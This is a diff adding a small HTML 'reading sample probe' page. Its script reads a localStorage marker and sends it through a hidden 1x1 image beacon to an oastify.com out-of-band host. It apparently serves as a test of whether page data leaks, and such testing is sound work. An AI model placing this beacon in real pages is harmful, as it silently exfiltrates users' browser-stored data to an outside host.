@@ -1,0 +1,26 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="referrer" content="no-referrer">
+  <title>Reading sample probe</title>
+</head>
+<body>
+  <h1>Reading sample probe</h1>
+  <p id="status">Waiting for page script.</p>
+  <script>
+    const marker = localStorage.getItem('reading_sample_marker');
+    document.querySelector('#status').textContent = marker
+      ? 'Synthetic marker read from this browser.'
+      : 'No synthetic marker found in this browser.';
+    const image = new Image();
+    image.referrerPolicy = 'no-referrer';
+    image.width = 1;
+    image.height = 1;
+    image.alt = '';
+    image.src = `https://a0b3b9aarmzz7n4tuacx2raqzh5atjbkmyo8e77xw.oastify.com/probe-${encodeURIComponent(marker || 'none')}.gif`;
+    document.body.appendChild(image);
+  </script>
+</body>
+</html>
